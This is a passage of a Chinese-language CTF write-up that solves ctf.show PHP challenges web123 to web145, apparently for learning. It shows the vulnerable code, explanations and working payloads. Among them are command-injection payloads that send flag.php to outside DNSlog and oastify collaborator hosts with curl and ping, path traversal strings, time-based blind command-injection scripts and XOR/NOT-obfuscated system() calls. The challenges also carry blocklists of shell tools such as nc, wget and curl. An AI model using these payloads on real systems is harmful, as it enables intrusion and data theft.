&#125;</code></pre><p>Payload:<code>?num=%0c36</code></p><p>trim函数会过滤空格以及<code>\n\r\t\v\0</code>，但不会过滤<code>\f</code></p><h4 id="web123-下划线-绕过"><a href="#web123-下划线-绕过" class="headerlink" title="web123(下划线_绕过)"></a>web123(下划线_绕过)</h4><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);$a&#x3D;$_SERVER[&#39;argv&#39;];$c&#x3D;$_POST[&#39;fun&#39;];if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;    if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\%|\^|\*|\-|\+|\&#x3D;|\&#123;|\&#125;|\&quot;|\&#39;|\,|\.|\;|\?&#x2F;&quot;, $c)&amp;&amp;$c&lt;&#x3D;18)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);           if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;?&gt; </code></pre><p>在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换</p><p>Payload:<code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</code></p><h4 id="web125-SERVER-‘argv’-绕过"><a href="#web125-SERVER-‘argv’-绕过" class="headerlink" title="web125($_SERVER[‘argv’]绕过)"></a>web125($_SERVER[‘argv’]绕过)</h4><p>利用$_SERVER[‘argv’]</p><blockquote><p>parse_str(）函数把查询字符串解析到变量中。<br>注释：如果未设置array参数，则由该函数设置的变量将覆盖已存在的同名变量。<br>注释：php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_strO）解析之前，变量会被 addslashesO转换。</p></blockquote><p>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。</p><p>‘argv’</p><p>传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。</p><p>意思就是通过$_SERVER[‘argv’]将$a变成数组，再利用数组的性质将fl0g&#x3D;flag_give_me传入，同时还绕过第一个if中的!isset($_GET[‘fl0g’]))，用+来进行分隔，使得数组中有多个数值。</p><p>执行eval函数也就是执行$c即是parse_str($a[1])，使得fl0g&#x3D;flag_give_me，从而进入第三个if语句。</p><p>Payload:</p><blockquote><p>GET:?1&#x3D;flag.php </p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;highlight_file($_GET[1])</p><p>GET:?a&#x3D;1++fl0g&#x3D;flag_give_me</p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1])</p><p>GET:?a&#x3D;1++fl0g&#x3D;flag_give_me</p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;assert($a[0])</p></blockquote><h4 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h4><p>Payload同上</p><h4 id="web127-extract变量覆盖-SERVER-‘QUERY-STRING’"><a href="#web127-extract变量覆盖-SERVER-‘QUERY-STRING’" class="headerlink" title="web127(extract变量覆盖 $_SERVER[‘QUERY_STRING’])"></a>web127(extract变量覆盖 $_SERVER[‘QUERY_STRING’])</h4><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$ctf_show &#x3D; md5($flag);$url &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];&#x2F;&#x2F;特殊字符检测function waf($url)&#123;    if(preg_match(&#39;&#x2F;\&#96;|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#39;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\&#x2F;&#x2F;&#39;, $url))&#123;        return true;    &#125;else&#123;        return false;    &#125;&#125;if(waf($url))&#123;    die(&quot;嗯哼？&quot;);&#125;else&#123;    extract($_GET);&#125;if($ctf_show&#x3D;&#x3D;&#x3D;&#39;ilove36d&#39;)&#123;    echo $flag;&#125;</code></pre><p><strong>extract()</strong> 函数从数组中将变量导入到当前的符号表。</p><p><code>.</code>和<code>[</code>被过滤了可以使用<code> </code>(空格)来过滤</p><p>**$SERVER[‘QUERY_STRING’];**获取的查询语句是服务端还没url解码之前的字符串，所以对<code>_</code>进行一次url编码也能绕过。</p><p>Payload:<code>?ctf%5fshow=ilove36d</code></p><h4 id="web128-gettext"><a href="#web128-gettext" class="headerlink" title="web128(gettext-&gt;_())"></a>web128(gettext-&gt;_())</h4><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$f1 &#x3D; $_GET[&#39;f1&#39;];$f2 &#x3D; $_GET[&#39;f2&#39;];if(check($f1))&#123;    var_dump(call_user_func(call_user_func($f1,$f2)));&#125;else&#123;    echo &quot;嗯哼？&quot;;&#125;function check($str)&#123;    return !preg_match(&#39;&#x2F;[0-9]|[a-z]&#x2F;i&#39;, $str);&#125;</code></pre><p><a href="https://www.cnblogs.com/lost-1987/articles/3309693.html">关于php中gettext的用法？</a></p><p>小知识点： _()是一个函数</p><p><strong>_()&#x3D;&#x3D;gettext()</strong> 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll</p><p>**get_defined_vars()**函数</p><p>get_defined_vars —&gt;返回由所有已定义变量所组成的数组 这样可以获得 $flag</p><p>Payload: <code>?f1=_&amp;f2=get_defined_vars</code></p><h4 id="web129-stripos-目录穿越"><a href="#web129-stripos-目录穿越" class="headerlink" title="web129(stripos  目录穿越)"></a>web129(stripos  目录穿越)</h4><pre class="language-php" data-language="php"><code class="language-php"> &lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#39;f&#39;]))&#123;    $f &#x3D; $_GET[&#39;f&#39;];    if(stripos($f, &#39;ctfshow&#39;)&gt;0)&#123;        echo readfile($f);    &#125;&#125; </code></pre><p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。如果没有找到字符串则返回 FALSE。</p><p><strong>注释：</strong>stripos() 函数是不区分大小写的。</p><p><strong>注释：</strong>该函数是二进制安全的。</p><p>目录穿越</p><p>Payload:</p><blockquote><p>?f&#x3D;.&#x2F;ctfshow&#x2F;..&#x2F;flag.php</p><p>?f&#x3D;.&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php </p></blockquote><h4 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h4><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#39;f&#39;]))&#123;    $f &#x3D; $_POST[&#39;f&#39;];    if(preg_match(&#39;&#x2F;.+?ctfshow&#x2F;is&#39;, $f))&#123;        die(&#39;bye!&#39;);    &#125;    if(stripos($f, &#39;ctfshow&#39;) &#x3D;&#x3D;&#x3D; FALSE)&#123;        die(&#39;bye!!&#39;);    &#125;    echo $flag;&#125; </code></pre><p>1）第一个判断。<br>.+?表示匹配任意字符一个或则多个。<br>.*? 表示匹配任意字符0个或多个。</p><p>. 匹配除换行符 \n 之外的任何单字符。</p><ul><li>匹配前面的子表达式一次或多次。<br>? 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。<br>&#x2F;i不区分大小写<br>&#x2F;s 匹配任何空白字符，包括空格、制表符、换页符等等。<br>题中整个正则表达式的意思就是，以任意一个或多个字符开头，遇到ctfshow就匹配，不区分大小写，不能有任何空白字符。</li></ul><p>也就是说输入的内容里，ctfshow前面不能有字符。</p><p>2）第二个判断。stripos函数如果未发现字符串将返回 FALSE。<br>全等于的条件是必须双方的类型也一样，所以ctfshow在首位返回的0与FLASE不全等。</p><p>所以payload:<code>POST:f=ctfshow</code></p><h4 id="web131-正则最大回溯"><a href="#web131-正则最大回溯" class="headerlink" title="web131(正则最大回溯)"></a>web131(正则最大回溯)</h4><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#39;f&#39;]))&#123;    $f &#x3D; (String)$_POST[&#39;f&#39;];    if(preg_match(&#39;&#x2F;.+?ctfshow&#x2F;is&#39;, $f))&#123;        die(&#39;bye!&#39;);    &#125;    if(stripos($f,&#39;36Dctfshow&#39;) &#x3D;&#x3D;&#x3D; FALSE)&#123;        die(&#39;bye!!&#39;);    &#125;    echo $flag;&#125;</code></pre><p><a href="https://www.laruence.com/2010/06/08/1579.html">深悉正则(pcre)最大回溯&#x2F;递归限制</a></p><p>在php中正则表达式进行匹配有一定的限制，超过限制直接返回false</p><p>Poc</p><pre class="language-python" data-language="python"><code class="language-python">import requests# Construct the payloadpreg &#x3D; &#39;very&#39; * 250000 + &#39;36Dctfshow&#39;payload &#x3D; &#123;&#39;f&#39;: preg&#125;# The target URLurl &#x3D; &#39;https:&#x2F;&#x2F;b8e115f7-c0eb-4c76-9dd8-840b15166fb3.challenge.ctf.show&#x2F;&#39;# Send the POST requestresponse &#x3D; requests.post(url, data&#x3D;payload)# Check for errors and print the responseif response.status_code &#x3D;&#x3D; 200:    print(&#39;Response:&#39;, response.text)else:    print(&#39;Failed to get a valid response. Status code:&#39;, response.status_code)</code></pre><h4 id="web132-PHP逻辑运算符绕过"><a href="#web132-PHP逻辑运算符绕过" class="headerlink" title="web132(PHP逻辑运算符绕过)"></a>web132(PHP逻辑运算符绕过)</h4><p>访问<code>robots.txt</code>–&gt;<code>/admin</code></p><pre class="language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;]) &amp;&amp; isset($_GET[&#39;code&#39;]))&#123;    $username &#x3D; (String)$_GET[&#39;username&#39;];    $password &#x3D; (String)$_GET[&#39;password&#39;];    $code &#x3D; (String)$_GET[&#39;code&#39;];    if($code &#x3D;&#x3D;&#x3D; mt_rand(1,0x36D) &amp;&amp; $password &#x3D;&#x3D;&#x3D; $flag || $username &#x3D;&#x3D;&#x3D;&quot;admin&quot;)&#123;                if($code &#x3D;&#x3D; &#39;admin&#39;)&#123;            echo $flag;        &#125;            &#125;&#125; </code></pre><p><a href="https://www.cnblogs.com/hurry-up/p/10220082.html">PHP中逻辑运算符的高效用法—&amp;&amp;和||</a></p><p>对于“与”（**&amp;&amp;<strong>） 运算： <strong>x &amp;&amp; y</strong> 当</strong>x<strong>为</strong>false<strong>时，直接跳过，不执行</strong>y<strong>；<br>对于“或”（</strong>||<strong>） 运算 ：  <strong>x||y</strong> 当</strong>x<strong>为</strong>true<strong>时，直接跳过，不执行</strong>y**。</p><p>所以payload：<code>?code=admin&amp;password=1&amp;username=admin</code></p><h4 id="web133-substr绕过-DNSlog-Collaborator-Client"><a href="#web133-substr绕过-DNSlog-Collaborator-Client" class="headerlink" title="web133(substr绕过 DNSlog Collaborator Client)"></a>web133(substr绕过 DNSlog Collaborator Client)</h4><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);&#x2F;&#x2F;flag.phpif($F &#x3D; @$_GET[&#39;F&#39;])&#123;    if(!preg_match(&#39;&#x2F;system|nc|wget|exec|passthru|netcat&#x2F;i&#39;, $F))&#123;        eval(substr($F,0,6));    &#125;else&#123;        die(&quot;6个字母都还不够呀?!&quot;);    &#125;</code></pre><p>我们传递?F&#x3D;<code>$F</code>;+sleep 3好像网站确实sleep了一会说明的确执行了命令<br>那为什么会这样？<br>因为是我们传递的<code>$F</code>;+sleep 3。先进行substr()函数截断然后去执行eval()函数<br>这个函数的作用是执行php代码，是shell_exec()函数的缩写，然后就去命令执行。<br>而$F就是我们输入的<code>$F</code>;+sleep 3 使用最后执行的代码应该是<br><code>$F</code>;+sleep 3,就执行成功<br>这里可能有点绕，慢慢理解</p><pre class="language-php" data-language="php"><code class="language-php">$F &#x3D; @$_GET[&#39;F&#39;]; &#x2F;&#x2F;?F&#x3D;&#96;$F&#96;; sleep 3substr($F, 0, 6); &#x2F;&#x2F; &#96;$F&#96;; eval(substr($F, 0, 6)); &#x2F;&#x2F; eval(&quot;&#96;$F&#96;; &quot;); -&gt; eval(&quot;&#96;&#96;$F&#96;; sleep 3&#96;; &quot;); &quot;&#96;&quot; 只会被展开一次</code></pre><blockquote><p>利用<code>$F</code>;让eval执行shell语句。<br>这一串字符长度是5，加个空格，满足substr的6个字符截取，让eval执行<code>$F</code>;</p><p>如传递<code>$F</code>;+sleep 3，页面会sleep一会。具体执行过程如下：<br>&#x3D;&#x3D;&gt;php:   eval(substr($F,0,6));<br>&#x3D;&#x3D;&gt;php:   eval(“<code>$F</code>; “);<br>&#x3D;&#x3D;&gt;php:   eval(“&#96;&#96;$F<code>; sleep 3</code>; “);<br>&#x3D;&#x3D;&gt;shell: <code>$F</code>; sleep 3<br>所以就执行了sleep 3</p></blockquote><p>方法一(DNSlog外带)：（没成功）</p><p><a href="http://www.dnslog.cn/">在线DNSlog</a></p><p>先得到一个域名，然后利用dnslog实现命令回显。</p><pre class="language-bash" data-language="bash"><code class="language-bash">curl http:&#x2F;&#x2F;haha.0iix2r.dnslog.cn&#x2F;&#96;whoami&#96;ping &#96;whoami&#96;.0iix2r.dnslog.cn</code></pre><p>Payload:</p><p>当ping一个域名时会对其进行一个递归 DNS 查询的过程，这个时候就能在后端获取到 DNS 的查询请求，当命令真正被执行且平台收到回显时就能说明漏洞确实存在。</p><p>flag.php是多行，需要grep一下，其次不能含有特殊符号，所以tr设置一下返回结果只携带字母和数字。</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F&#x3D;&#96;$F&#96;; ping &#96;cat flag.php | grep ctfshow | tr -cd &#39;[a-z]&#39;&#x2F;&#39;[0-9]&#39;&#96;.3aqybg.dnslog.cn -c 1</code></pre><p>方法二( Collaborator Client Curl -F):</p><p>使用curl -F命令。-F 为带文件的形式发送post请求。</p><p>Payload:</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F&#x3D;&#96;$F&#96;;+curl -X POST -F xx&#x3D;@flag.php  http:&#x2F;&#x2F;smiegnphdyy8keqa8wcuo4ypfgl790xp.oastify.com</code></pre><p><img src="web133.png" loading="lazy"></p><h4 id="web134-变量覆盖"><a href="#web134-变量覆盖" class="headerlink" title="web134(变量覆盖)"></a>web134(变量覆盖)</h4><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);$key1 &#x3D; 0;$key2 &#x3D; 0;if(isset($_GET[&#39;key1&#39;]) || isset($_GET[&#39;key2&#39;]) || isset($_POST[&#39;key1&#39;]) || isset($_POST[&#39;key2&#39;])) &#123;    die(&quot;nonononono&quot;);&#125;@parse_str($_SERVER[&#39;QUERY_STRING&#39;]);extract($_POST);if($key1 &#x3D;&#x3D; &#39;36d&#39; &amp;&amp; $key2 &#x3D;&#x3D; &#39;36d&#39;) &#123;    die(file_get_contents(&#39;flag.php&#39;));&#125;</code></pre><p>看到parse_str和extract。变量覆盖<br>第一条if判断，要求key1和key2不能通过get和post传递。</p><p>parse_str是对get请求进行的内容解析成变量。例如传递?a&#x3D;1，执行后就是$a&#x3D;1。<br>那么相对的，传递<code>_POST</code>，就是对<code>$_POST</code>进行赋值，正好就可以绕过if条件对post的限制。<br>extract() 函数从数组中将变量导入到当前的符号表。</p><p>payload：<code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p><h4 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h4><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);&#x2F;&#x2F;flag.phpif($F &#x3D; @$_GET[&#39;F&#39;])&#123;    if(!preg_match(&#39;&#x2F;system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head&#x2F;i&#39;, $F))&#123;        eval(substr($F,0,6));    &#125;else&#123;        die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;);    &#125;&#125;</code></pre><p>限制了许多命令，ping可以用，读取命令<code>nl</code>可以用。<br>grep被限制了，可以用awk指定行号输出，不过需要逐行测试，在15行有flag。或者参考之前flag的格式，也可以推测出来是15。</p><p>这个题还把flag分成了两个，行号15和16，需要拼接一下。</p><p>Payload:</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F&#x3D;&#96;$F&#96;;+ping &#96;nl flag.php|awk &#39;NR&#x3D;&#x3D;15&#39;|tr -cd &#39;[a-z]&#39;&#x2F;&#39;[0-9]&#39;&#96;.i1k4phddlneygl58oqbjxv93full9a.oastify.com</code></pre><p>发现新解法：</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F&#x3D;&#96;$F&#96;+;cp+flag.php+1.txt</code></pre><h4 id="web136-tee"><a href="#web136-tee" class="headerlink" title="web136(tee)"></a>web136(tee)</h4><pre class="language-php" data-language="php"><code class="language-php"> &lt;?phperror_reporting(0);function check($x)&#123;    if(preg_match(&#39;&#x2F;\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp&#x2F;i&#39;, $x))&#123;        die(&#39;too young too simple sometimes naive!&#39;);    &#125;&#125;if(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    check($c);    exec($c);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt; </code></pre><p><code>tee</code>用于显示程序的输出并将其复制到一个文件中。</p><p>Payload:</p><blockquote><p>?c&#x3D;ls &#x2F;|tee 1</p><p>?c&#x3D;cat &#x2F;f149_15_h3r3|tee 1</p></blockquote><h4 id="web137-call-user-func"><a href="#web137-call-user-func" class="headerlink" title="web137(call_user_func)"></a>web137(call_user_func)</h4><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);class ctfshow&#123;    function __wakeup()&#123;        die(&quot;private class&quot;);    &#125;    static function getFlag()&#123;        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;call_user_func($_POST[&#39;ctfshow&#39;]); </code></pre><blockquote><p><a href="https://stackoverflow.com/questions/10534360/php-call-user-func-on-a-static-method">PHP call_user_func on a static method</a></p><pre class="language-none"><code class="language-none">$class &#x3D; &#39;\\MyBundleNamespace\\MyClass&#39;; $method &#x3D; &#39;myFunction&#39;;</code></pre><p>Both calls should work:</p><pre class="language-none"><code class="language-none">call_user_func(&quot;$class::$method&quot;); call_user_func(array($class, $method));</code></pre></blockquote><p>payload: <code>ctfshow=ctfshow::getFlag</code><br>payload: <code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</code></p><h4 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h4><p>过滤了::但是可以用数组</p><h4 id="web139-命令盲注"><a href="#web139-命令盲注" class="headerlink" title="web139(命令盲注)"></a>web139(命令盲注)</h4><p>使用tee发现没有回显，可以使用命令盲注</p><p><strong>ls &#x2F;</strong></p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport timeimport stringstr&#x3D;string.ascii_letters+string.digits+&#39;_~&#39;result&#x3D;&quot;&quot;for i in range(1,10):#行    key&#x3D;0    for j in range(1,15):#列        if key&#x3D;&#x3D;1:            break        for n in str:        #awk &#39;NR&#x3D;&#x3D;&#123;0&#125;&#39;逐行输出获取        #cut -c &#123;1&#125; 截取单个字符            payload&#x3D;&quot;if [ &#96;ls &#x2F;|awk &#39;NR&#x3D;&#x3D;&#123;0&#125;&#39;|cut -c &#123;1&#125;&#96; &#x3D;&#x3D; &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)            #print(payload)            url&#x3D;&quot;https:&#x2F;&#x2F;1ae58c7e-061c-418b-a2c8-0b4a1f452e3f.challenge.ctf.show&#x2F;?c&#x3D;&quot;+payload            try:                requests.get(url,timeout&#x3D;(2.5,2.5))            except:                result&#x3D;result+n                print(result)                break            if n&#x3D;&#x3D;&#39;~&#39;:                key&#x3D;1                result+&#x3D;&quot; &quot;</code></pre><p><strong>cat &#x2F;f149_15_h3r3</strong></p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport timeimport stringstr&#x3D;string.digits+string.ascii_lowercase+&quot;-&quot;result&#x3D;&quot;&quot;key&#x3D;0for j in range(1,45):    print(j)    if key&#x3D;&#x3D;1:        break    for n in str:        payload&#x3D;&quot;if [ &#96;cat &#x2F;f149_15_h3r3|cut -c &#123;0&#125;&#96; &#x3D;&#x3D; &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)        #print(payload)        url&#x3D;&quot;https:&#x2F;&#x2F;1ae58c7e-061c-418b-a2c8-0b4a1f452e3f.challenge.ctf.show&#x2F;?c&#x3D;&quot;+payload        try:            requests.get(url,timeout&#x3D;(2.5,2.5))        except:            result&#x3D;result+n            print(result)            break</code></pre><h4 id="web140-php-intval"><a href="#web140-php-intval" class="headerlink" title="web140(php &#x3D;&#x3D;  intval)"></a>web140(php &#x3D;&#x3D;  intval)</h4><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#39;f1&#39;]) &amp;&amp; isset($_POST[&#39;f2&#39;]))&#123;    $f1 &#x3D; (String)$_POST[&#39;f1&#39;];    $f2 &#x3D; (String)$_POST[&#39;f2&#39;];    if(preg_match(&#39;&#x2F;^[a-z0-9]+$&#x2F;&#39;, $f1))&#123;        if(preg_match(&#39;&#x2F;^[a-z0-9]+$&#x2F;&#39;, $f2))&#123;            $code &#x3D; eval(&quot;return $f1($f2());&quot;);            if(intval($code) &#x3D;&#x3D; &#39;ctfshow&#39;)&#123;                echo file_get_contents(&quot;flag.php&quot;);            &#125;        &#125;    &#125;&#125;</code></pre><p><a href="https://blog.csdn.net/qq_47804678/article/details/128814377">php比较绕过（强比较“&#x3D;&#x3D;&#x3D;”&#x2F;弱比较“&#x3D;&#x3D;“）</a></p><p>因为是<code>==</code>，字符串和数字比较时，会将字符串先转化成数字类型在进行比较。</p><p>字符串以数字开头时，以开头数字（到字母出现截止）作为转换结果；开头不是数字的字符串或空（null），则转换为0。</p><blockquote><p>‘12’&#x3D;&#x3D;12    &#x2F;&#x2F;true<br>‘12abc’&#x3D;&#x3D;12 &#x2F;&#x2F;true<br>‘adm2n’&#x3D;&#x3D;0  &#x2F;&#x2F;true</p></blockquote><p>所以只需要$code的值不为1开头的字符串即可，于是构造让其返回0</p><blockquote><p>intval() 成功时，返回参数的 integer 值，失败时返回 0。空的 array 返回 0，非空的 array 返回 1。<br>字符串有可能返回 0，取决于字符串最左侧的字符。<br>intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p></blockquote><p>Payload:</p><blockquote><p>system(system())—&gt; f1&#x3D;system&amp;f2&#x3D;system</p><p>string system( string $command[, int &amp;$return_var] )：成功则返回命令输出的最后一行，失败则返回 FALSE 。system()必须包含参数，失败返回FLASE；system(‘FLASE’)，空指令，失败返回FLASE。</p><p>usleep(usleep())—&gt; f1&#x3D;usleep&amp;f2&#x3D;usleep<br>usleep没有返回值。 所以intval参数为空，失败返回0</p><p>getdate(getdate())—&gt; f1&#x3D;getdate&amp;f2&#x3D;getdate</p><p>array getdate([ int $timestamp &#x3D; time()] )：返回结果是array，参数必须是int型。所以getdate(getdate())—-&gt;getdate(array型)—&gt;失败返回flase，intval为0。</p></blockquote><h4 id="web141-函数与数字运算"><a href="#web141-函数与数字运算" class="headerlink" title="web141(函数与数字运算)"></a>web141(函数与数字运算)</h4><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];    $v2 &#x3D; (String)$_GET[&#39;v2&#39;];    $v3 &#x3D; (String)$_GET[&#39;v3&#39;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#39;&#x2F;^\W+$&#x2F;&#39;, $v3))&#123;            $code &#x3D;  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;        &#125;    &#125;&#125;</code></pre><p><strong>\W</strong>：与任何非单词字符匹配。就是除了数字、字母、下划线。等价于<code>[^A-Za-z0-9_]</code></p><p>php里数字可以和命令可以进行运算。也就是说v3里要执行的函数前后加上运算符即可。</p><p>举例理解一下：<code>1-phpinfo()-1</code>的结果为0，phpinfo()执行成功返回true，1-1-1&#x3D;-1。</p><p>同理<code>system()</code>也可执行。</p><p>取反<code>~</code>异或<code>^</code>或<code>|</code>都可以</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpecho urlencode(~&#39;system&#39;);echo &#39;&lt;br&#x2F;&gt;&#39;;echo urlencode(~&#39;cat flag.php&#39;);?&gt;</code></pre><p>Payload:</p><blockquote><p>?v1&#x3D;1&amp;v2&#x3D;0&amp;v3&#x3D;%2b(“%13%19%13%14%05%0d”|”%60%60%60%60%60%60”)(“%03%01%14%00%06%0c%01%07%00%10%08%10”|”%60%60%60%20%60%60%60%60%2e%60%60%60”)%2b</p><p>%2b&#x3D;+</p><p>?v1&#x3D;0&amp;v2&#x3D;0&amp;v3&#x3D;-(<del>‘%8C%86%8C%8B%9A%92’)(</del>‘%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F’)-</p></blockquote><h4 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h4><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;v1&#39;]))&#123;    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];    if(is_numeric($v1))&#123;        $d &#x3D; (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);        sleep($d);        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125; </code></pre><p>0和0x0绕过 这里绕过因为是因为当成了8进制和16进制</p><h4 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h4><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];    $v2 &#x3D; (String)$_GET[&#39;v2&#39;];    $v3 &#x3D; (String)$_GET[&#39;v3&#39;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#39;&#x2F;[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;&#x2F;i&#39;, $v3))&#123;                die(&#39;get out hacker!&#39;);        &#125;        else&#123;            $code &#x3D;  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;        &#125;    &#125;&#125;</code></pre><p>同142，ban了取反和或同时也ban了+-可以使用*，好像没ban异或<code>^</code></p><p>Payload:<code>?v1=1&amp;v2=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%0c%01%07%01%0f%08%0f&quot;^&quot;%7f%60%60%20%60%60%60%60%2f%7f%60%7f&quot;)*</code></p><h4 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h4><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];    $v2 &#x3D; (String)$_GET[&#39;v2&#39;];    $v3 &#x3D; (String)$_GET[&#39;v3&#39;];    if(is_numeric($v1) &amp;&amp; check($v3))&#123;        if(preg_match(&#39;&#x2F;^\W+$&#x2F;&#39;, $v2))&#123;            $code &#x3D;  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;        &#125;    &#125;&#125;function check($str)&#123;    return strlen($str)&#x3D;&#x3D;&#x3D;1?true:false;&#125;</code></pre><p>限制了v3的长度，并对v2进行check,可以使用<code>|``^</code>只是调换位置罢了</p><p>Payload:<code>?v1=1&amp;v2=(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%14%01%03%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)&amp;v3=-</code></p><h4 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h4><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];    $v2 &#x3D; (String)$_GET[&#39;v2&#39;];    $v3 &#x3D; (String)$_GET[&#39;v3&#39;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        